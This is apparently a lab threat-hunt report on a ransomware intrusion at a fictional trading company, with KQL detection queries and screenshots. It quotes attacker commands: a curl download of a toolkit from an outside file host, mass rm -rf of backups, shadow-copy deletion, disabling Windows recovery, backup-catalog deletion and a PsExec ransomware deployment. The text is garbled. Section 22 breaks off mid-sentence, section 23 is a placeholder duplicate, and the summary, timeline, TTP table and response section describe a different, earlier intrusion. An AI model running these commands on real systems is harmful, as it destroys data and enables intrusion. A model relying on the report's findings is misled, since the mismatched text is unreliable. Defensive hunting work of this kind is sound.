# Threat Hunt Report: Multi-Platform Backup Destruction and Ransomware Deployment

## Executive Summary

Azuki Import & Export Trading Co. experienced a catastrophic ransomware attack on November 27, 2025, marking the culmination of a week-long intrusion. The investigation revealed a sophisticated multi-phase operation beginning with lateral movement from the compromised CEO workstation (azuki-adminpc) to the Linux backup server via SSH. This was followed by the: (1) systematic destruction of backup infrastructure; (2) Windows-based ransomware deployment using PsExec across multiple systems; (3) comprehensive recovery inhibition techniques; (4) establishment of persistent access mechanisms; (5) anti-forensic activities to eliminate evidence; and (6) successful encryption of organizational data with ransom note deployment. 

The threat actor demonstrated advanced operational maturity through coordinated backup destruction on Linux systems, simultaneous ransomware deployment to multiple Windows targets using stolen credentials, multiple layers of recovery inhibition including shadow copy deletion and backup catalog removal, registry and scheduled task persistence mechanisms, and USN journal deletion for anti-forensics. This investigation reconstructs the complete attack timeline documenting tactics consistent with ADE SPIDER (APT-SL44, SilentLynx) operations targeting logistics companies in the East Asia region.

## Background
- **Incident Date:** November 25-27, 2025  
- **Compromised Host:** Linux backup server (azuki-backupsrv), Multiple Windows systems  
- **Threat Actor:** ADE SPIDER (APT-SL44, SilentLynx)
- **Motivation:** Financial  
- **Target Profile:** Logistics and import/export companies, East Asia region  
- **Typical Dwell Time:** 21-45 days  
- **Attack Sophistication:** High, featuring coordinated multi-platform ransomware operations

---

## Investigation Steps

### 1. Lateral Movement: Remote Access & Compromised Account

Searched for evidence of SSH lateral movement and discovered that the threat actor executed the following remote access command from the compromised workstation (azuki-adminpc): "ssh.exe" backup-admin@10.1.0.189. This established remote access to the Linux backup server at 10.1.0.189. This lateral movement occurred after the initial CEO PC compromise, indicating a deliberate escalation phase targeting recovery infrastructure. In addition, analysis of the SSH connection details confirmed that the attacker used the backup-admin account to access the Linux backup server. This administrative account likely had elevated privileges on the backup infrastructure, providing full access to backup directories and scheduled jobs.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("ssh.exe", "ssh")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine

```
<img width="2067" height="281" alt="DITW_Q1" src="https://github.com/user-attachments/assets/4f9fd76c-5919-4a7e-a0bc-4e27d30936f1" />

---

### 2. Lateral Movement: Attack Source

Searched for the attack source (i.e., the IP address that initiated the connection to the backup server) by examining network connections to the backup server and identified the source IP address as 10.1.0.108 (i.e., azuki-adminpc). The connection was established over SSH port 22, confirming the compromised CEO workstation as the pivot point for the attack. This also confirms the attack progression from executive system compromise to backup infrastructure targeting.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-adminpc"
| where RemoteIP == "10.1.0.189" and RemotePort == 22
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, RemotePort, InitiatingProcessCommandLine

```
<img width="2657" height="761" alt="DITW_Q2B" src="https://github.com/user-attachments/assets/b822c22f-3fdf-4f62-9023-e60369d8040c" />

---

### 3. Discovery: Directory Enumeration

Searched for evidence of directory enumeration and discovered that the threat actor executed the following directory listing command with detailed output (-la flags) to enumerate the main backup directory structure: ls --color=auto -la /backups/. This provided the threat actor with a detailed view of the backup directory structure, file permissions, and timestamps. This was followed by a more targeted enumeration of subdirectories (configs/, fileserver/, workstations/, etc).

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("ls", "dir", "find")
| where ProcessCommandLine contains "backup"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2699" height="936" alt="DITW_Q4" src="https://github.com/user-attachments/assets/b3be2b8c-61e4-44ca-9c1c-27cf336b7f84" />

---

### 4. Discovery: File Search 

Searched for evidence of file search operations by the threat actor and discovered that the threat actor executed the following find command to locate all compressed backup archives in tar.gz format: find /backups -name *.tar.gz. This targeted search identified specific backup files for subsequent deletion, demonstrating the systematic targeting of recovery data for destruction before deploying ransomware.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName == "find"
| where ProcessCommandLine contains "backup"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2517" height="747" alt="DITW_Q5" src="https://github.com/user-attachments/assets/cf882bc7-0121-472d-81b7-adb8e2db365b" />

---

### 5. Discovery: Account Enumeration

Searched for evidence of local account enumeration on the Linux backup server and discovered that the threat actor executed the following command to access the /etc/passwd file: cat /etc/passwd. The /etc/passwd file contains user account information (e.g, usernames, UIDs, home directories, shells) and was accessed in order to enumerate all local user accounts on the backup server. This likely helped the threat actor to understand what accounts exist on the system, potentially providing intelligence for privilege escalation and lateral movement planning.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("cat", "id", "whoami", "users", "w", "who")
| where ProcessCommandLine contains "/etc/passwd" 
    or ProcessCommandLine contains "/etc/shadow"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated desc

```
<img width="2380" height="288" alt="DITW_Q6" src="https://github.com/user-attachments/assets/91ffcae1-91b7-48bb-b717-ee0b93286f1c" />

---

### 6. Discovery: Scheduled Job Reconnaissance 

Searched for evidence of scheduled job enumeration and discovered that the threat actor executed the following command to access the crontab file in order to enumerate automated backup schedules: cat /etc/crontab. This revealed system-wide scheduled backup jobs, allowing the threat actor to understand backup schedules and timing for maximum impact.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("crontab", "cat", "ls", "systemctl")
| where ProcessCommandLine contains "cron" 
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2688" height="928" alt="DITW_Q7" src="https://github.com/user-attachments/assets/34e33cad-83ab-4d4e-b2f5-062811d9f824" />

---

### 7. Command and Control: Tool Transfer

Searched for evidence of external tool downloads and discovered that the threat actor executed the following command to download an attack toolkit named destroy.7z from external C2 infrastructure (i.e., litter.catbox.moe) using root privileges: curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z. 
 
**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("curl", "scp", "ftp")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2444" height="295" alt="DITW_Q8" src="https://github.com/user-attachments/assets/3db67575-09ba-443b-aa60-6b45ff291e11" />

---

### 8. Credential Access: Credential Theft 

Searched for evidence of credential file access and discovered that the threat actor executed the following command to access stored credentials: cat /backups/configs/all-credentials.txt. The plaintext credential file likely contained stored authentication information and was accessed on the backup server. 

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("cat", "grep")
| where ProcessCommandLine contains "password" 
    or ProcessCommandLine contains "passwd"
    or ProcessCommandLine contains "credentials"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2194" height="676" alt="DITW_Q9" src="https://github.com/user-attachments/assets/77cd6f48-4521-4c63-9a66-2f818bef8111" />

---

### 9. Impact: Data Destruction

Searched for evidence of data destruction and discovered that the threat actor executed the following command to destroy back up files: rm -rf /backups/archives. The threat actor deleted all backup directories as root, including destroying daily, weekly, monthly, database, configuration, and workstation backups, thereby eliminating all recovery options. The full command is as follows: rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations.


**Query used to locate events:**

```kql
DeviceProcessEvents 
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName in~ ("rm", "shred") 
| where ProcessCommandLine contains "/backups" 
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2805" height="856" alt="DITW_Q10" src="https://github.com/user-attachments/assets/d6b9adf0-10ef-4bb3-acaf-7e7c898dcfab" />

---

### 10. Impact: Service Stop  

Searched for evidence of service disruption and discovered that the threat actor executed the following command as root to stop the backup service: systemctl stop cron. The cron service was stopped using systemctl, immediately disabling all scheduled backup jobs. This was likely done to prevent any automated backup creation during the ransomware deployment phase.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName == "systemctl"
| where ProcessCommandLine has "stop"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2018" height="363" alt="DITW_Q11" src="https://github.com/user-attachments/assets/faf017a1-a32f-4d9a-8426-c4a2fbe4d82d" />

---
### 11. Impact: Service Disabled

Searched for evidence of permanent service disruption and discovered that the threat actor executed the following command to permanently disable the backup service: systemctl disable cron. This permanently disabled the cron service from starting on boot, ensuring backup jobs would not resume even after system restart.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where FileName == "systemctl"
| where ProcessCommandLine has "disable"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1994" height="324" alt="DITW_Q12" src="https://github.com/user-attachments/assets/e8e7e8e3-48e1-4721-93e7-8252def3158b" />

---

### 12. Lateral Movement: Remote Execution, Deployment, & Malicious Payload

Searched for evidence of remote execution tool usage and discovered that the threat actor utilized the following tool to execute commands on remote systems: PsExec64.exe. PsExec64 is a Sysinternals remote administration tool that is commonly repurposed by threat actors for malware deployment. The tool was executed from the compromised CEO workstation (i.e., azuki-adminpc) and likely used to execute commands on multiple remote Windows systems simultaneously. In addition, the threat actor executed the following deployment command: "PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe. The full PsExec64 command shows the target system (10.1.0.102), use of the kenji.sato account credentials, and the path to the ransomware payload executable. The -c flag copies the specified executable to the remote host for execution, and -f forces the copy even if a file with the same name already exists on the remote system. The the ransomware payload "silentlynx.exe" was deployed to C:\Windows\Temp\cache\.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("psexec.exe", "psexec64.exe", "wmic.exe", "wmiexec.py", "smbexec.py", "paexec.exe")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2771" height="887" alt="DITW_Q13_14_15" src="https://github.com/user-attachments/assets/e958a00a-0d1e-47f9-9f8b-46d8a3b6c0f6" />

---

### 13. Impact: Shadow Service Stopped 

Searched for evidence of shadow copy service disruption and discovered that the threat actor executed the following command to programmatically terminate the Volume Shadow Copy Service: "net" stop VSS /y. This immediately stopped the VSS service on multiple systems, using the /y flag to bypass interactive confirmation prompts. The threat actor likely executed this command to prevent the OS from creating automated recovery points during the encryption process, thereby hindering data restoration efforts.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where ProcessCommandLine contains "vss" and ProcessCommandLine contains "stop"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1788" height="481" alt="DITW_Q16" src="https://github.com/user-attachments/assets/8ad49792-c574-4e34-82ff-d9d4482dca04" />

---

### 14. Impact: Backup Engine Stopped 

Searched for evidence of backup engine disruption and discovered that the threat actor executed the following command to stop the Windows Backup Engine: "net" stop wbengine /y. This was likely done to stop Windows Backup from creating automated backups during encryption (i.e., the attack).

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("net.exe", "net1.exe", "sc.exe")
| where ProcessCommandLine contains "stop"
| where ProcessCommandLine contains "backup" 
    or ProcessCommandLine contains "wbengine"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1828" height="480" alt="DITW_Q17" src="https://github.com/user-attachments/assets/1e503ca0-9c3f-4418-9a49-a0477d10d6bf" />

---

### 15. Defense Evasion: Process Termination

Searched for evidence of process termination and discovered that the threat actor executed the following process termination command to forcefully terminate SQL Server: "taskkill" /F /IM sqlservr.exe. In addition, other database processes (e.g., MySQL, Oracle, PostgreSQL, MongoDB) and Office applications (e.g., Outlook, Excel, Word) were also forcefully terminated across multiple systems. This was likely performed to release file locks on high-value data stores, ensuring the ransomware could successfully encrypt the underlying database files and documents without interference.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("taskkill.exe", "wmic.exe")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="1894" height="937" alt="DITW_Q18" src="https://github.com/user-attachments/assets/16ddd328-4ee1-404b-afbd-0df5451b1b10" />

---

### 16. Impact: Recovery Point Deletion

Searched for evidence of recovery point deletion and discovered that the threat actor executed the following command: "vssadmin.exe" delete shadows /all /quiet. Therefore, all volume shadow copies were deleted using vssadmin with the /quiet flag to suppress output. This eliminated all Windows restore points and previous file versions, making file-level recovery impossible through native Windows mechanisms.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("vssadmin.exe", "wmic.exe", "wbadmin.exe")
| where ProcessCommandLine contains "delete" 
    and (ProcessCommandLine contains "shadow" 
         or ProcessCommandLine contains "catalog"
         or ProcessCommandLine contains "backup")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2097" height="616" alt="DITW_Q19" src="https://github.com/user-attachments/assets/0f757a85-b778-4226-8390-3e9e80cb1522" />

---

### 17. Impact: Storage Limitation

Searched for evidence of storage limitation operations and discovered that the threat actor executed the following vssadmin resize command to place restrictions on shadow copy storage allocation: "vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB. Therefore, shadow copy storage was restricted to a minimal 401MB, effectively preventing the creation of new shadow copies due to insufficient space allocation. This ensures that even if shadow copy services are restarted, no new recovery points can be created.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName == "vssadmin.exe"
| where ProcessCommandLine contains "resize" 
    or ProcessCommandLine contains "maxsize"
    or ProcessCommandLine contains "storage"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2452" height="467" alt="DITW_Q20B" src="https://github.com/user-attachments/assets/fd97741f-7822-4012-b448-d2497b544f22" />

---

### 18. Impact: Recovery Disabled

Searched for evidence of recovery environment disabling events and discovered that the threat actor executed the following command to disable the Windows Recovery Environment: "bcdedit" /set {default} recoveryenabled No. Therefore, the Windows Recovery Environment was permanently disabled using bcdedit, preventing users from booting into recovery mode to restore their system or access repair tools. This effectively removed another critical recovery path.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName in~ ("bcdedit.exe", "reg.exe", "powershell.exe", "wmic.exe", "diskpart.exe")
| where ProcessCommandLine contains "recoveryenabled" 
    or ProcessCommandLine contains "bootstatuspolicy"
    or ProcessCommandLine contains "storage"
    or ProcessCommandLine contains "quota"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2792" height="397" alt="DITW_Q21" src="https://github.com/user-attachments/assets/25686061-e6e3-43ae-b068-8a6f5551219d" />

---

### 19. Impact: Catalog Deletion

Searched for evidence of backup catalog deletion and discovered that the threat actor executed the following command to delete the Windows Backup catalog database: "wbadmin" delete catalog -quiet. Without the catalog, Windows Backup cannot locate or restore any previous backups, even if the backup files still exist.


**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where FileName == "wbadmin.exe"
| where ProcessCommandLine contains "catalog" or ProcessCommandLine contains "delete"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc

```
<img width="2038" height="336" alt="DITW_Q22" src="https://github.com/user-attachments/assets/d11273e0-0426-47f0-949f-57a9acb45a43" />

---

### 20. Persistence: Registry Autorun

Searched for registry autorun modifications and discovered that the threat actor created a registry Run key named WindowsSecurityHealth. This was configured to execute a malicious binary, silentlynx.exe, located in the C:\Windows\Temp\ directory upon user login. By using a value name that mimics a legitimate Windows security component, it's able to masquerade as a system process in order to avoid detection and ensure that the malware remains active across system reboots.

**Query used to locate events:**

```kql
DeviceRegistryEvents
| where TimeGenerated >= datetime(2025-11-25 05:00:00)
| where DeviceName contains "azuki"
| where RegistryKey contains "Run" 
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData
| sort by TimeGenerated asc

```
<img width="2701" height="381" alt="DITW_Q23" src="https://github.com/user-attachments/assets/c1c0ffd7-dde1-434c-a600-a57693987906" />

---

### 21. Persistence: Scheduled Execution

Searched for evidence of scheduled task persistence and discovered that the threat actor created a scheduled task under the Microsoft\Windows\Security path to execute silentlynx.exe at user logon with highest privileges. The task name SecurityHealthService mimics legitimate Windows security tasks, providing stealth and persistence through system reboots and user session changes. This provides redundant persistence alongside the registry autorun mechanism.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28)) 
| where DeviceName contains "azuki" 
| where FileName == "schtasks.exe" 
| where ProcessCommandLine contains "create" 
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine

```
<img width="2775" height="877" alt="DITW_Q24B" src="https://github.com/user-attachments/assets/f04ce935-edd8-43ce-9b93-d62dcc226f26" />

---

### 22. Defense Evasion: Journal Deletion

Searched for evidence of... 

master password extraction and discovered the following file which contained the extracted KeePass master password: KeePass-Master-Password.txt. The master password file was a plaintext file stored in the Documents\Passwords folder, providing the attacker with access to all credentials stored in the KeePass database.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where ActionType == "FileCreated"
| where FileName has "master"
| where FileName endswith ".txt"
| project TimeGenerated, FileName, FolderPath
| order by TimeGenerated asc

```
<img width="2099" height="279" alt="BT_Q25" src="https://github.com/user-attachments/assets/fc460c31-6c9f-48da-b9e6-0d09915ff9cc" />

---

### 23. XXXXX

Searched for evidence of master password extraction and discovered the following file which contained the extracted KeePass master password: KeePass-Master-Password.txt. The master password file was a plaintext file stored in the Documents\Passwords folder, providing the attacker with access to all credentials stored in the KeePass database.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated >= datetime(2025-11-19)
| where DeviceName == "azuki-adminpc"
| where ActionType == "FileCreated"
| where FileName has "master"
| where FileName endswith ".txt"
| project TimeGenerated, FileName, FolderPath
| order by TimeGenerated asc

```
<img width="2099" height="279" alt="BT_Q25" src="https://github.com/user-attachments/assets/fc460c31-6c9f-48da-b9e6-0d09915ff9cc" />

---

## Summary

The investigation revealed a sophisticated post-compromise operation targeting the CEO's administrative workstation. The attacker returned five days after the initial November 19-20, 2025 file server breach, conducting lateral movement from the previously compromised system at 10.1.0.204 to azuki-adminpc using the compromised yuki.tanaka account credentials. The operation demonstrated advanced tactics consistent with ADE SPIDER (APT-SL44, SilentLynx) including infrastructure rotation (litter.catbox.moe for payload delivery), masqueraded payload (payload disguised as Windows update KB5044273-x64.7z), and sophisticated command-and-control deployment using Meterpreter with named pipe msf-pipe-5902.

The attacker established redundant persistence through creation of backdoor account yuki.tanaka2 with Administrator privileges, ensuring continued access even if primary credentials were reset. Comprehensive discovery activities included RDP session enumeration (qwinsta), domain trust mapping (nltest /domain_trusts /all_trusts), and network connection enumeration (netstat -ano), demonstrating systematic environmental reconnaissance.

Credential theft operations targeted multiple high-value sources: KeePass password database Passwords.kdbx with plaintext master password in KeePass-Master-Password.txt, Chrome browser credentials via Mimikatz DPAPI extraction, and systematic collection of financial documents using Robocopy with retry logic and network optimization. Eight distinct archives were created in the hidden staging directory C:\ProgramData\Microsoft\Crypto\staging, masquerading as legitimate Windows cryptographic services.

Exfiltration operations transferred the archives to gofile.io cloud storage (45.112.123.227) using curl with form-based POST uploads. The comprehensive nature of this exfiltration indicates intent to maintain long-term access to organizational credentials and sensitive business intelligence.

The sophistication of this attack, including multiple persistence mechanisms, renamed tool usage (m.exe for Mimikatz), masqueraded staging directories, and systematic multi-target collection, is consistent with ADE SPIDER's known tactics, techniques, and procedures. The targeting of a logistics company CEO in East Asia aligns with the group's established operational patterns and financial motivation.

---

## Timeline

| Time (UTC) | Action Observed | Key Evidence |
|:------------:|:-----------------:|:--------------:|
| 2025-11-20 15:01:44 | Password Database Located | Passwords.kdbx discovered in Documents\Passwords\ |
| 2025-11-20 15:01:44 | Master Password File Present | KeePass-Master-Password.txt stored in plaintext |
| 2025-11-24 14:31:24 | Network Connection Enumeration | netstat.exe -ano executed for reconnaissance |
| 2025-11-25 04:06:36 | Lateral Movement: Initial RDP Access | RDP connection from 10.1.0.204 using yuki.tanaka account |
| 2025-11-25 04:08:58 | RDP Session Enumeration | qwinsta.exe executed to enumerate active sessions |
| 2025-11-25 04:09:25 | Domain Trust Enumeration | nltest.exe /domain_trusts /all_trusts executed |
| 2025-11-25 04:13:48 | Password Database Search | cmd.exe executed where /r C:\Users *.kdbx |
| 2025-11-25 04:21:11 | Malware Download | KB5044273-x64.7z downloaded via curl.exe from litter.catbox.moe |
| 2025-11-25 04:21:12 | Payload Hosting Service Connection | Connection to litter.catbox.moe (162.159.130.233) |
| 2025-11-25 04:21:33 | Archive Extraction | 7z.exe extracted KB5044273-x64.7z payload |
| 2025-11-25 04:21:33 | C2 Implant Extraction | meterpreter.exe extracted from archive |
| 2025-11-25 04:24:35 | C2 Implant Deployment | Meterpreter named pipe msf-pipe-5902 established |
| 2025-11-25 04:25:14 | Backdoor Account Created | yuki.tanaka2 account created |
| 2025-11-25 04:25:18 | Privilege Escalation | yuki.tanaka2 added to Administrators group |
| 2025-11-25 04:25:59 | Collection: Chrome Credentials Archive | chrome-credentials.tar.gz created in staging directory |
| 2025-11-25 04:36:09 | Collection: Banking Documents | Robocopy.exe copied banking documents to staging |
| 2025-11-25 04:39:16 | Collection: First Archive Creation | tar.exe created credentials.tar.gz |
| 2025-11-25 04:39:23 | Collection: QuickBooks Data | quickbooks-data.tar.gz created |
| 2025-11-25 04:40:00 | Collection: Tax Documents | tax-documents.tar.gz created |
| 2025-11-25 04:40:30 | Collection: Contracts Data | contracts-data.tar.gz created |
| 2025-11-25 04:41:51 | Exfiltration: First Archive Upload | credentials.tar.gz uploaded to gofile.io |
| 2025-11-25 04:41:52 | Exfiltration: Destination Server | gofile.io (45.112.123.227) received stolen data |
| 2025-11-25 04:42:04 | Exfiltration: QuickBooks Upload | quickbooks-data.tar.gz uploaded to gofile.io |
| 2025-11-25 04:42:13 | Exfiltration: Banking Records Upload | banking-records.tar.gz uploaded to gofile.io |
| 2025-11-25 04:42:23 | Exfiltration: Tax Documents Upload | tax-documents.tar.gz uploaded to gofile.io |
| 2025-11-25 04:42:33 | Exfiltration: Contracts Upload | contracts-data.tar.gz uploaded to gofile.io |
| 2025-11-25 04:49:19 | Exfiltration: Chrome Credentials Upload | chrome-credentials.tar.gz uploaded to gofile.io |
| 2025-11-25 05:55:34 | Tool Download | m.exe (Mimikatz) downloaded via curl.exe |
| 2025-11-25 05:55:54 | Browser Credential Theft | Mimikatz dpapi::chrome extracted Chrome credentials |
| 2025-11-25 05:56:42 | Collection: Chrome Session Theft | chrome-session-theft.tar.gz created (8th archive) |
| 2025-11-25 05:56:50 | Exfiltration: Final Archive Upload | chrome-session-theft.tar.gz uploaded to gofile.io |

---

**Note:** Password database files were present on the system since November 20. Network reconnaissance occurred on November 24, prior to the November 25 lateral movement, suggesting earlier compromise phases. The attack progressed systematically from initial access through credential theft, data collection, and multi-stage exfiltration over approximately 2 hours.

---

## Relevant MITRE ATT&CK TTPs

| TTP ID | TTP Name | Description | Detection Relevance |
|:--------:|:----------:|:-------------:|:---------------------:|
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral movement from 10.1.0.204 to azuki-adminpc via RDP using compromised yuki.tanaka account | Detects unauthorized lateral movement and credential reuse from previously compromised systems |
| T1078 | Valid Accounts: Local Accounts | Use of compromised yuki.tanaka credentials for authentication during lateral movement and privilege escalation | Identifies authentication with compromised credentials across multiple systems |
| T1204.002 | User Execution: Malicious File | Execution of payload KB5044273-x64.7z masquerading as Windows update package | Detects masquerading through file naming and execution of suspicious archives |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Meterpreter C2 communication via named pipe msf-pipe-5902 for command execution | Identifies Metasploit Framework indicators and named pipe C2 channels |
| T1136.001 | Create Account: Local Account | Creation of backdoor account yuki.tanaka2 for persistent access | Detects suspicious account creation with naming patterns similar to legitimate users |
| T1098 | Account Manipulation | Addition of yuki.tanaka2 to Administrators group via net localgroup command | Identifies privilege escalation through group membership modifications |
| T1087.001 | Account Discovery: Local Account | Execution of query session to enumerate active RDP sessions | Detects reconnaissance of logged-in users and session information |
| T1482 | Domain Trust Discovery | Execution of nltest /domain_trusts to map Active Directory trust relationships | Identifies reconnaissance of domain architecture and potential lateral movement paths |
| T1049 | System Network Connections Discovery | Execution of netstat -ano to enumerate active TCP/IP connections and listening ports | Detects network reconnaissance and service discovery activities |
| T1555.005 | Credentials from Password Stores: Password Managers | Discovery and theft of KeePass database Passwords.kdbx with plaintext master password | Identifies targeting of password manager databases and credential stores |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Mimikatz dpapi::chrome extraction of Chrome browser credentials via DPAPI | Detects credential dumping from browser databases using DPAPI decryption |
| T1003.001 | OS Credential Dumping: LSASS Memory | Use of Mimikatz (m.exe) for credential extraction operations | Identifies renamed Mimikatz instances and credential dumping activities |
| T1119 | Automated Collection | Robocopy execution with /E /R:1 /W:1 flags for systematic financial document collection | Detects bulk data collection with retry logic and attribute preservation |
| T1074.001 | Data Staged: Local Data Staging | Use of C:\ProgramData\Microsoft\Crypto\staging directory for data consolidation | Identifies hidden staging directories masquerading as system folders |
| T1560.001 | Archive Collected Data: Archive via Utility | Use of tar.exe to create 8 compressed archives of stolen data | Detects cross-platform compression tools and bulk archive creation |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Curl POST uploads to gofile.io (45.112.123.227) for data exfiltration | Identifies file uploads to anonymous cloud storage services |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Payload named KB5044273-x64.7z to appear as Windows update; m.exe to hide Mimikatz | Detects file masquerading and renamed security tools |
| T1027 | Obfuscated Files or Information | Use of 7z compression for payload delivery and staging directory name obfuscation | Identifies obfuscation techniques and suspicious archive formats |

---

This table organizes the MITRE ATT&CK techniques (TTPs) observed during the investigation. The detection methods identified both the attack techniques and enabled confirmation of the threat actor's sophistication through multiple layers of persistence, discovery, credential theft, collection, and exfiltration operations.

---

## Response Taken

| MITRE Mitigation ID | Name | Action Taken | Description | Relevance |
|:---------------------:|:------:|:--------------:|:-------------:|:-----------:|
| M1032 | Multi-factor Authentication | Enforced MFA | Enforced MFA for all RDP connections and privileged account access. Implemented conditional access policies requiring MFA for lateral movement between systems. | Prevents lateral movement via compromised passwords by requiring additional authentication factors even with valid credentials. |
| M1027 | Password Reset | Account Credential Reset | Reset credentials for yuki.tanaka account and all passwords stored in Passwords.kdbx KeePass database. Rotated Chrome saved passwords and KeePass master password. | Mitigates unauthorized access risks by invalidating potentially compromised credentials stored in exfiltrated databases. |
| M1026 | Privileged Account Management | Administrative Access Review | Removed yuki.tanaka2 backdoor account. Conducted comprehensive audit of all privileged accounts and group memberships. Implemented principle of least privilege. | Eliminates backdoor access and prevents unauthorized administrative operations through rogue accounts. |
| M1028 | Operating System Configuration | Application Control (WDAC) | Deployed Windows Defender Application Control policies to prevent execution of renamed binaries like m.exe (Mimikatz) and unauthorized compression tools. | Restricts execution of unauthorized applications and renamed security tools through code integrity policies. |
